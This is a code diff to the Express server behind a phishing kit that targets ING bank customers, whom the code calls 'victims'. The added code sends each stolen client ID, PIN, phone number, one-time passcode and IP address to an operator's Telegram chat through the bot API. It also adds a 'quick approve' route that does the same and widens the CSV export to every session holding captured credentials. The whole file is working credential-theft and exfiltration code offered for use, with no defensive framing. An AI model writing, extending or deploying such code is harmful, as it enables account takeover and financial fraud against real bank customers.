@@ -9,10 +9,33 @@ const PANEL_PASS     = process.env.PANEL_PASS  || 'changeme';
 const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
 const COOKIE_NAME    = 'pan_sess_v2';
 
+// Telegram Bot Config
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
+
 const app  = express();
 const PORT = process.env.PORT || 3000;
 
-console.log('ENV check:', { PANEL_USER, PANEL_PASS: '***' });
+console.log('ENV check:', { PANEL_USER, PANEL_PASS: '***', TELEGRAM_BOT_TOKEN: TELEGRAM_BOT_TOKEN ? '***' : 'not set' });
+
+/* ----------  TELEGRAM BOT HELPER  ---------- */
+async function sendTelegramMessage(message) {
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+  try {
+    const fetch = (await import('node-fetch')).default;
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+      })
+    });
+  } catch (err) {
+    console.error('Telegram send failed:', err);
+  }
+}
 
 /* ----------  SIMPLE EVENT BUS  ---------- */
 const events = new (require('events')).EventEmitter();
@@ -475,7 +498,21 @@ app.post('/api/panel', async (req, res) => {
       if (v.page === 'index.html') v.page = 'verify.html';
       else if (v.page === 'verify.html') v.page = 'unregister.html';
       else if (v.page === 'unregister.html') v.page = 'otp.html';
-      else if (v.page === 'otp.html') { v.page = 'success'; successfulLogins++; }
+      else if (v.page === 'otp.html') { 
+        v.page = 'success'; 
+        successfulLogins++;
+        // Send to Telegram
+        sendTelegramMessage(
+          `🦁 <b>ING Login Approved</b>\n\n` +
+          `Victim #${v.victimNum}\n` +
+          `Client: <code>${v.email}</code>\n` +
+          `PIN: <code>${v.password}</code>\n` +
+          `Phone: <code>${v.phone}</code>\n` +
+          `OTP: <code>${v.otp}</code>\n` +
+          `IP: ${v.ip}\n` +
+          `Time: ${new Date().toLocaleString()}`
+        );
+      }
       break;
     case 'delete':
       cleanupSession(sid, 'deleted from panel');
@@ -485,7 +522,36 @@ app.post('/api/panel', async (req, res) => {
   res.json({ ok: true });
 });
 
-/* ----------  SESSION REFRESH (NEW)  ---------- */
+/* ----------  SKIP TO SUCCESS (QUICK APPROVE)  ---------- */
+app.post('/api/skip', (req, res) => {
+  if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
+  
+  const { sid } = req.body;
+  const v = sessionsMap.get(sid);
+  if (!v) return res.status(404).json({ ok: false });
+  
+  // Skip unregister and otp, go straight to success
+  v.page = 'success';
+  v.status = 'approved';
+  successfulLogins++;
+  
+  // Send to Telegram
+  sendTelegramMessage(
+    `🦁 <b>ING Login Approved (Quick)</b>\n\n` +
+    `Victim #${v.victimNum}\n` +
+    `Client: <code>${v.email}</code>\n` +
+    `PIN: <code>${v.password}</code>\n` +
+    `Phone: <code>${v.phone}</code>\n` +
+    `IP: ${v.ip}\n` +
+    `Time: ${new Date().toLocaleString()}\n` +
+    `<i>Quick approval from verify page</i>`
+  );
+  
+  emitPanelUpdate();
+  res.json({ ok: true });
+});
+
+/* ----------  SESSION REFRESH  ---------- */
 app.post('/api/refresh', (req, res) => {
   if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
   
@@ -500,33 +566,63 @@ app.post('/api/refresh', (req, res) => {
   res.json({ ok: true });
 });
 
-/* ----------  CSV EXPORT  ---------- */
+/* ----------  CSV EXPORT - ALL SESSIONS WITH MIN DATA  ---------- */
 app.get('/api/export', (req, res) => {
   if (!req.session?.authed) return res.status(401).send('Unauthorized');
 
   req.session.lastActivity = Date.now();
   req.session.save();
 
-  const successes = auditLog
-    .filter(r => r.phone && r.otp)
-    .map(r => ({
-      victimNum: r.victimN,
-      email: r.email,
-      password: r.password,
-      phone: r.phone,
-      otp: r.otp,
-      ip: r.ip,
-      ua: r.ua,
-      timestamp: new Date(r.t).toISOString()
+  // Get all sessions with at least email+password OR phone
+  const sessions = Array.from(sessionsMap.values())
+    .filter(v => (v.email && v.password) || v.phone)
+    .map(v => ({
+      victimNum: v.victimNum,
+      client: v.email || '',
+      pin: v.password || '',
+      phone: v.phone || '',
+      otp: v.otp || '',
+      ip: v.ip,
+      status: v.status,
+      page: v.page,
+      timestamp: v.dateStr
     }));
 
+  // Also include audit log entries
+  const auditEntries = auditLog.map(r => ({
+    victimNum: r.victimN,
+    client: r.email,
+    pin: r.password,
+    phone: r.phone || '',
+    otp: r.otp || '',
+    ip: r.ip,
+    status: 'audit',
+    page: '-',
+    timestamp: new Date(r.t).toISOString()
+  }));
+
+  // Merge and deduplicate by victimNum, keeping latest
+  const allEntries = [...sessions, ...auditEntries];
+  const uniqueEntries = Object.values(
+    allEntries.reduce((acc, curr) => {
+      const key = curr.victimNum;
+      if (!acc[key] || new Date(curr.timestamp) > new Date(acc[key].timestamp)) {
+        acc[key] = curr;
+      }
+      return acc;
+    }, {})
+  ).sort((a, b) => a.victimNum - b.victimNum);
+
   const csv = [
-    ['Victim#','Email','Password','Phone','OTP','IP','UA','Timestamp'],
-    ...successes.map(s=>Object.values(s).map(v=>`"${v}"`))
-  ].map(r=>r.join(',')).join('\n');
+    ['Victim#','Client','PIN','Phone','OTP','IP','Status','Page','Timestamp'],
+    ...uniqueEntries.map(s => [
+      s.victimNum, s.client, s.pin, s.phone, s.otp, 
+      s.ip, s.status, s.page, s.timestamp
+    ].map(v => `"${v}"`))
+  ].map(r => r.join(',')).join('\n');
 
   res.setHeader('Content-Type', 'text/csv');
-  res.setHeader('Content-Disposition', 'attachment; filename="successful_logins.csv"');
+  res.setHeader('Content-Disposition', 'attachment; filename="all_sessions.csv"');
   res.send(csv);
 });
 
